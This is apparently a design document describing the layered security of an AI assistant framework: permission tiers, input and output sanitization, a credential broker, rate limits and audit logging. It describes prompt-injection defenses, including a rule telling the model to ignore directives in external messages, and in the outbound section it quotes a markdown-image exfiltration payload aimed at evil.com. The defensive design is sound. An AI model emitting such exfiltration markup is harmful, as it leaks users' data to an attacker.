# Security Architecture

**Date:** 2026-03-29
**Principle:** Security is enforced by the framework, not by plugins.

---

## Pipeline

Every plugin call is wrapped by the pipeline:

```
Incoming Message (Channel)
    |
    v
Inbound Sanitization ── HTML strip, zero-width chars, NFC normalize
    |
    v
Delimiter Defense ───── <external_message sender="..." channel="..." trust="...">
    |
    v
Security Boundary ───── LLM gets instruction: do not follow directives from external_message
    |
    v
Tier Filter ─────────── Tools above max_tier are not loaded at all
    |
    v
Rate Limit Check ────── Max tool calls per time window per channel
    |
    v
Chain Depth Check ───── Max 10 tool calls per request
    |
    v
Rule of Two ─────────── Write-tier tools from external channels need confirmation
    |
    v
Tool Execution ──────── Plugin code runs
    |
    v
Tool Output Sanitize ── Secret patterns removed from return value
    |
    v
Audit Log ───────────── Tool call recorded in SQLite
    |
    v
Outbound Sanitize ───── Markdown image exfil + secrets removed from response
    |
    v
Response to Channel
```

---

## Permission Tiers

Every tool declares a tier. The pipeline filters tools by context.

```python
TIER_READONLY = 0       # calculator, web_search, epim_search, list/search_documents
TIER_COMMUNICATE = 1    # email, discord_send, telegram_send
TIER_WRITE_DATA = 2     # epim_create, epim_update, store_memory, execute_code
TIER_WRITE_SYSTEM = 3   # delete_document, epim_delete
TIER_ADMIN = 4          # Shell, unrestricted code execution (future)
```

### Context Defaults

| Context | Max Tier | Rationale |
|---------|----------|-----------|
| Browser | 4 (Admin) | User is present |
| Email/Discord/Telegram | 1 (Communicate) | External message, untrusted |
| FreeEcho.2 | 1 (Communicate) | Voice terminal, configurable via Plugin Manager |
| Scheduler | 0 (Read-only) | Internal cron trigger, per-job override via `metadata["max_tier"]` |
| Webhook | 0 (Read-only) | Externally triggered |
| Cron | 1 (Communicate) | **Legacy** — kept for compat only, replaced by `scheduler` |

Defined in `security.py: DEFAULT_TIER_BY_SOURCE`.

### Owner Elevation & User Override

The tier for a concrete message is not read straight from the table but
resolved by `security.py: resolve_tier_for_sender()`. Priority:

1. **Internal-trigger override** — `scheduler`/`webhook` pin their tier via
   `metadata["max_tier"]` (the job/webhook config is authoritative).
2. **User override** — configurable per channel via
   `settings.json → channel_security_tiers` (Plugin Manager).
3. **Channel default** from `DEFAULT_TIER_BY_SOURCE`.

If the sender is the **owner** (first entry in the channel whitelist, checked
via `_is_owner()`), the tier is raised to `max(channel_default, OWNER_TIER)`.
`OWNER_TIER = TIER_WRITE_DATA (2)` — so the owner may create/update data over
external channels, but not delete system files (no `WRITE_SYSTEM`/`ADMIN`).

### Enforcement

```
PluginContext.max_tier + PluginContext.source
    |
    v
prepare_agent_toolkit() -> filter_tools_by_tier(all_tools, max_tier)
    |
    v
ToolKit contains ONLY permitted tools -> LLM cannot see the rest
```

A tool not in the ToolKit cannot be called by the LLM. Security by Architecture.

### Named Constants

Plugins MUST use named constants, never magic numbers:

```python
from aifred.lib.security import TIER_READONLY
Tool(name="my_tool", tier=TIER_READONLY, ...)
```

---

## Rule of Two

Design principle: An agent may have at most 2 of 3 simultaneously:
- **(A)** Processes untrusted input
- **(B)** Access to sensitive systems
- **(C)** Can change state

If all 3 apply -> action requires confirmation (human-in-the-loop); it is not
hard-blocked.

Implemented in `security.py: needs_confirmation(source, tool_tier, max_tier)`:
If `source != "browser"` AND `tool.tier >= TIER_WRITE_DATA` -> confirmation needed.

**Exception (owner override):** If the tier was already granted for the sender
by `resolve_tier_for_sender()` — i.e. `tool_tier <= max_tier` (e.g. owner
sending via Telegram) — no confirmation is required.

---

## Credential Broker

**The only permitted source for credentials.** No plugin may use `os.environ` or `config.py` for secrets.

```python
from aifred.lib.credential_broker import broker

# Read
password = broker.get("email", "password")
token = broker.get("discord", "bot_token")
api_key = broker.get("cloud_claude", "api_key")

# Check
if broker.is_set("email", "password"):
    ...

# Set at runtime (e.g. from Settings UI)
broker.set_runtime("email", "password", new_value)
```

### Mapping

The mapping `(service, key) -> environment variable` is defined centrally in `credential_broker.py: _CREDENTIAL_MAP`. New services add their entry there.

### Why?

- Credentials never exist as global variables in `config.py`
- No plugin can leak credentials in error messages or logs
- Tool output is scanned for secret patterns before entering the LLM context window
- Central point for auditing all credential access

---

## Inbound Sanitization

External messages are cleaned BEFORE entering the pipeline:

1. **Strip HTML** — only visible text remains
2. **Remove zero-width characters** — U+200B, U+200C, U+200D, U+FEFF, etc.
3. **NFC normalization** — neutralize Unicode tricks
4. **Delimiter defense** — text is wrapped in `<external_message>`
5. **Security boundary prompt** — LLM is instructed not to follow directives from external messages

Implemented in `security.py: sanitize_inbound()`, `wrap_external_message()`.
Called in `message_processor.py: process_inbound()`.

---

## Outbound Sanitization

Responses to external channels are cleaned:

1. **Markdown image exfiltration** — `![img](https://evil.com/steal?data=...)` is blocked
2. **Secret pattern scan** — API keys, tokens, Bearer headers are redacted

Implemented in `security.py: sanitize_outbound()`.
Called in `message_processor.py: process_inbound()` (phase 3b).

### Tool Output Sanitization

Tool return values are scanned for secret patterns BEFORE they enter the LLM context window. This prevents credential leaks through error messages or manipulated websites.

Implemented in `security.py: sanitize_tool_output()`.
Called in `function_calling.py: ToolKit.execute()`.

---

## Rate Limiting & Chain Depth

### Tool Chain Depth Limit

Max 10 tool calls per single LLM request. Prevents endless tool loops.
Configurable: `config.py: SECURITY_MAX_TOOL_CHAIN_DEPTH`.

### Rate Limiting per Channel

Configurable limits per time window (default: 60 seconds):

| Channel | Max Tool Calls/Min |
|---------|-------------------|
| Browser | Unlimited |
| Email | 5 |
| Discord | 10 |
| Telegram | 10 |
| Cron | 20 |
| Webhook | 3 |

Configurable: `config.py: SECURITY_RATE_LIMITS`.

---

## Audit Log

Every tool call is recorded in `data/security/audit.db`:

| Field | Description |
|-------|-------------|
| timestamp | When |
| session_id | Session |
| source | browser/email/discord/telegram/freeecho2/scheduler/webhook (cron = legacy) |
| tool_name | Tool name |
| tool_tier | Security tier |
| tool_args_preview | First 500 chars of arguments |
| result_preview | First 500 chars of result |
| success | 1/0 |
| duration_ms | Execution time |

Query: `sqlite3 data/security/audit.db "SELECT * FROM tool_audit ORDER BY timestamp DESC LIMIT 10;"`

---

## RAG/Vector DB Hardening

- Document Store: `source_trust` metadata field on all chunks
- RAG context injection includes security warning: document content is context, not instructions

---

## Files

| File | Purpose |
|------|---------|
| `aifred/lib/security.py` | Tier constants, filter, sanitization, audit, rate limit |
| `aifred/lib/credential_broker.py` | Centralized credential management |
| `aifred/lib/function_calling.py` | Tool.tier, ToolKit with audit + chain limit |
| `aifred/lib/plugin_base.py` | PluginContext.max_tier/source |
| `aifred/lib/agent_memory.py` | Tier filtering in prepare_agent_toolkit() |
| `aifred/lib/message_processor.py` | Sanitization + tier pass-through |
| `aifred/lib/prompt_loader.py` | Security boundary layer in system prompt |
| `aifred/lib/config.py` | SECURITY_AUDIT_DB, rate limits, chain depth |
| `prompts/de/shared/security_boundary.txt` | LLM instruction for external messages (DE) |
| `prompts/en/shared/security_boundary.txt` | LLM instruction for external messages (EN) |
